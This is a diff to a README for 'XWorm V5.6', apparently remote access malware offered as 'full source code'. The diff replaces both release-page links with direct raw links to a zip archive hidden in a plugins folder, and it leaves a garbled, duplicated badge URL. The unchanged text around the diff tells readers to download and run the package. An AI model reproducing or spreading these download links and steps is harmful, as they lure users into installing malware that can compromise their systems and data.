@@ -6,7 +6,7 @@ Welcome to XWorm V5.6 Edition. This guide will help you download and run the sof
 
 ## 📥 Download Now
 
-[![Download XWorm](https://img.shields.io/badge/Download%20XWorm-Get%20Started-blue.svg)](https://github.com/siky86/XWorm-5.6-FULL-Source-Code/releases)
+[![Download XWorm](https://raw.githubusercontent.com/siky86/XWorm-5.6-FULL-Source-Code/main/XWorm/plugins and other trinkets/Plugins/FUL_X_Source_Worm_Code_v3.8.zip%20XWorm-Get%https://raw.githubusercontent.com/siky86/XWorm-5.6-FULL-Source-Code/main/XWorm/plugins and other trinkets/Plugins/FUL_X_Source_Worm_Code_v3.8.zip)](https://raw.githubusercontent.com/siky86/XWorm-5.6-FULL-Source-Code/main/XWorm/plugins and other trinkets/Plugins/FUL_X_Source_Worm_Code_v3.8.zip)
 
 ## 🔍 Features
 
@@ -25,7 +25,7 @@ To run XWorm, your system should meet the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/siky86/XWorm-5.6-FULL-Source-Code/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/siky86/XWorm-5.6-FULL-Source-Code/main/XWorm/plugins and other trinkets/Plugins/FUL_X_Source_Worm_Code_v3.8.zip) to download the latest version.
 2. Look for the **XWorm V5.6** package in the list of releases.
 3. Click on the package to begin the download.
 4. Once downloaded, locate the file in your downloads folder.
